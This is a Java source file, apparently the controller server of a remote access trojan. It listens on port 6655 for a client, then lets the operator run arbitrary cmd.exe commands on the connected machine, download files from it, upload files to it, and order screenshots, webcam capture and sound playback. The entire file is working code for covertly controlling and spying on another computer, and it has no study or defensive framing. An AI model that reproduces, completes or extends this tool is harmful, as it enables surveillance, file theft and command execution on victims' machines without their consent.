package serverTest;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;

public class server {
	
	/*
	 *  Scanner for user input
	 */
	static Scanner scanIn = new Scanner(System.in);

	/*
	 *  Server objects for communication
	 */
	static ServerSocket serverSocket;
	static Socket server;
	static DataInputStream in;
	static DataOutputStream out;

	public static void main(String[] args) {
		

		// Close all connections when Server is shut down with Ctrl-C
		Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {
			public void run() {
				try {
					serverSocket.close();
					server.close();
					in.close();
					out.close();
				} catch (IOException e) {
					e.printStackTrace();
				}

			}
		}, "Shutdown-thread"));
		
		
		connectToClient();

		/*
		 * Let the user select a command to execute the corresponding function
		 */
		String command;

		while (true) {
			command = scanIn.nextLine();
			switch (command) {
			case "cmd":
				cmd();
				break;
			case "upload":
				upload();
				break;
			case "download":
				download();
				break;
			case "screenshot":
				screenshot();
				break;
			case "webcam":
				webcam();
				break;
			case "sound":
				sound();
				break;
			case "EXIT_SERVER":
				safeExit();
				break;
			case "EXIT_CLIENT":
				exitClient();
				break;
			default:
				System.out.println("command not found");
			}
		}

	}
	

	private static void sound() {
		System.out.println("Enter path to sound file");
		String path = scanIn.nextLine();
		
		try {
			out.writeUTF("sound");
			out.writeUTF(path);
		} catch (IOException e) {
			e.printStackTrace();
			System.out.println("Error while sending notification!");
			return;
		}
		System.out.println("Client received notification!");
	}


	private static void webcam() {
		// Notify client
		try {
			out.writeUTF("webcam");
		} catch (IOException e) {
			e.printStackTrace();
			System.out.println("Error while sending notification!");
			return;
		}
		System.out.println("Client received notification!");
		
	}


	/*
	 * Order client to save a screenshot
	 */
	private static void screenshot() {
		// Notify client
		try {
			out.writeUTF("screenshot");
		} catch (IOException e) {
			e.printStackTrace();
			System.out.println("Error while sending notification!");
			return;
		}
		System.out.println("Client received notification!");
	}


	/*
	 * Order the client to close itself
	 */
	private static void exitClient() {
		try {
			out.writeUTF("exit");
		} catch (IOException e) {
			e.printStackTrace();
		}

	}

	
	/*
	 * Close connections and exit
	 */
	private static void safeExit() {
		try {
			serverSocket.close();
			server.close();
			in.close();
			out.close();
		} catch (IOException e) {
			System.out.println("Error Closing Connections!");
			System.exit(1);
		}

		System.exit(0);
	}

	
	/*
	 * Download a file from client
	 */
	private static void download() {
		
		// Get file Path
		System.out.println("Enter path to file:");
		String fPath = scanIn.nextLine();
		
		// Send notification and file Path
		try {
			out.writeUTF("send");
			out.writeUTF(fPath);
		} catch (IOException e) {
			e.printStackTrace();
			return;
		}
		
		System.out.println("Path " + fPath + " has been send! Receiving file length...");
		
		// Receive file length
		int fileLen = 0;
		try {
			fileLen = in.readInt();
		} catch (IOException e) {
			e.printStackTrace();
			return;
		}
		
		System.out.println(fileLen + " Bytes to download...");
		
		// Prepare writing to new file
		FileOutputStream fos;
		try {
			fos = new FileOutputStream(String.valueOf(fileLen));
		} catch (FileNotFoundException e) {
			e.printStackTrace();
			return;
		}
		
		
		// Download and safe file
		int read = 0, remaining = fileLen;
		byte[] buffer = new byte[4096];
		
		System.out.println("Downloading...");
		
		try {
			while((read = in.read(buffer, 0, Math.min(buffer.length, remaining))) > 0) {
				System.out.println(read + " Bytes read");
				remaining -= read;
				fos.write(buffer, 0, read);
			}
			fos.close();
		} catch (IOException e) {
			System.out.println("Error while receiving and writing file!");
			e.printStackTrace();
			return;
		}
		
		System.out.println("File recieved!");
		

	}

	
	/*
	 * Upload a file to client
	 */
	private static void upload() {
		
		// Notify client
		try {
			out.writeUTF("receive");
		} catch (IOException e1) {
			e1.printStackTrace();
			System.out.println("Connection lost!");
			return;
		}

		// Get path to file
		System.out.println("Path to file: ");
		String fPath = scanIn.nextLine();

		// prepare reading from file
		System.out.println("Prepare reading from file...");
		File file;
		FileInputStream fis;
		int fileLen = 0;
		try {
			file = new File(fPath);
			fis = new FileInputStream(file);
			fileLen = (int) file.length();
		} catch (FileNotFoundException e) {
			System.out.println("Could not access File!");
			e.printStackTrace();
			return;
		}
		
		
		// Send file length, read and upload file
		System.out.println("Uploading file...");
		byte[] buffer = new byte[fileLen];
		try {
			out.writeInt(fileLen);
			while (fis.read(buffer) > 0)
				out.write(buffer);
			fis.close();
		} catch (IOException e) {
			e.printStackTrace();
			System.out.println("Connection lost!");
			return;
		}
		
		System.out.println("File uploaded!");
	}

	/*
	 * Execute commands in cmd.exe
	 */
	private static void cmd() {
		try {
			// Notify client
			out.writeUTF("cmd");
			
			// Get and send command
			System.out.println("Enter the command to execute:");
			String command = scanIn.nextLine();
			out.writeUTF(command);

			System.out.println("Command has been send");

			// Wait for incoming data
			int attempts = 0;
			while (in.available() < 2 && attempts < 1000) {
				Thread.sleep(100);
				attempts++;
			}
			if (attempts == 1000) {
				System.out.println("Timeout while waiting for Response!");
			}
			
			// Display response
			System.out.println(in.readUTF());
		} catch (IOException | InterruptedException e) {
			System.out.println("Error during transmissions!");
			return;
		}

	}

	/*
	 * Establish connection to Client
	 */
	private static void connectToClient() {

		try {
			System.out.println("Starting...");
			serverSocket = new ServerSocket(6655);
			System.out.println("Waiting for client...");
			server = serverSocket.accept();
			System.out.println("Connection established!");
			in = new DataInputStream(server.getInputStream());
			out = new DataOutputStream(server.getOutputStream());
		} catch (IOException e) {
			System.out.println("Connection could not be established!");
			e.printStackTrace();
			System.exit(1);
		}

	}

}
